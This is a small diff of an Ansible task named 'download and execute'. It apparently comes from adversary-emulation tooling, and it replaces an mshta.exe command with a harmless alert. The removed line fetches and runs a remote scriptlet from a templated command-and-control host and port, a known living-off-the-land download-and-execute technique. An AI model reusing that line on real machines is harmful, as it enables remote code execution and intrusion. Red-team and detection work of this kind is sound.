@@ -6,5 +6,5 @@
   tasks:
     - name: download and execute
       win_command: |
-        "c:\windows\system32\mshta.exe javascript:a=(GetObject('script:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }}')).Exec();close();"
+        c:\windows\system32\mshta.exe javascript:a=(alert("print"))
       
